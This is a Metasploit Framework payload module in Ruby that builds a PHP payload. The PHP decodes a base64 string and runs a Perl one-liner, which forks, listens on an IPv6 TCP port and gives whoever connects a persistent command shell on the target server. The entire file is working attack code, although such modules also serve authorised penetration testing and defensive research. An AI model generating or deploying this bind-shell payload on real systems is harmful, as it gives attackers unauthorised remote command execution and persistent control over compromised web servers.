##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

	include Msf::Payload::Single
	include Msf::Sessions::CommandShellOptions

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'PHP Command Shell, Bind TCP (via perl) IPv6',
			'Description'   => 'Listen for a connection and spawn a command shell via perl (persistent) over IPv6',
			'Author'        => ['Samy <samy@samy.pl>', 'cazz'],
			'License'       => BSD_LICENSE,
			'Platform'      => 'php',
			'Arch'          => ARCH_PHP,
			'Handler'       => Msf::Handler::BindTcp,
			'Session'       => Msf::Sessions::CommandShell,
			'PayloadType'   => 'cmd',
			'Payload'       =>
				{
					'Offsets' => { },
					'Payload' => ''
				}
			))
	end

	#
	# Constructs the payload
	#
	def generate
		return super + "system(base64_decode('#{Rex::Text.encode_base64(command_string)}'));"
	end

	#
	# Returns the command string to use for execution
	#
	def command_string

		cmd = "perl -MIO -e '$p=fork();exit,if$p;" +
			"$c=new IO::Socket::INET6(LocalPort,#{datastore['LPORT']},Reuse,1,Listen)->accept;" +
			"$~->fdopen($c,w);STDIN->fdopen($c,r);system$_ while<>'"

		return cmd
	end

end
